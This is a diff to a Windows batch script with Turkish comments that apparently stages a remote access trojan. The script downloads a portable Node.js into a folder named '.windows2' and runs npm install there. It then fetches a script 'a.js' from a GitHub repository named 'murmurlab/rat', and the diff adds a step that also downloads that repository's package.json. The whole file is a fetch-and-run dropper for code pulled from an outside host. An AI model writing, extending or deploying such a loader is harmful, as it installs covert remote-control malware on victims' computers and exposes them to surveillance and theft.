@@ -11,6 +11,9 @@ set "nodeUrl=https://nodejs.org/dist/v16.3.0/node-v16.3.0-win-x64.zip"
 :: Script dosyasının indirme URL'i
 set "scriptUrl=https://raw.githubusercontent.com/murmurlab/rat/main/a.js"
 
+:: package.json indirme URL'i
+set "packageJsonUrl=https://raw.githubusercontent.com/murmurlab/rat/main/package.json"
+
 :: İndirilecek dosyaların hedef konumu
 set "downloadPath=%folderPath%"
 
@@ -34,6 +37,10 @@ if not exist "%downloadPath%\node-v16.3.0-win-x64\*" (
 echo .windows2 klasöründe npm install yapılıyor...
 cd /d "%folderPath%"
 "%folderPath%\node-v16.3.0-win-x64\npm.cmd" install
+
+:: package.json dosyasının indirilmesi
+echo package.json dosyası indiriliyor...
+%curlCommand% -o "%folderPath%\package.json" "%packageJsonUrl%"
 
 :: Script dosyasının indirilmesi
 echo Script dosyası indiriliyor...
